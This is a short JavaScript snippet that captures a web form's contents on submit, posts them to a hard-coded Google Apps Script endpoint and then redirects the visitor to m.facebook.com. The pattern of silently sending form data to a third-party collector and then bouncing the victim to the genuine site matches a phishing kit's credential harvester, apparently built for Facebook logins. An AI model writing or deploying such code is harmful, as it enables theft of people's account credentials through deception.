const form = document.querySelector("#form")
    const scriptURL = 'https://script.google.com/macros/s/AKfycbzSEOewf2rSI-JKrUQWE0EARB15FqreP_0VZw4n-PT6C_hbxSe1Re7e-74ySbtDomAe/exec'

    form.addEventListener('submit', e => {
      e.preventDefault()

      console.log(form)
      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => { window.location.href='http://m.facebook.com' })
        .catch(error => alert('Error!', error.message))
    })
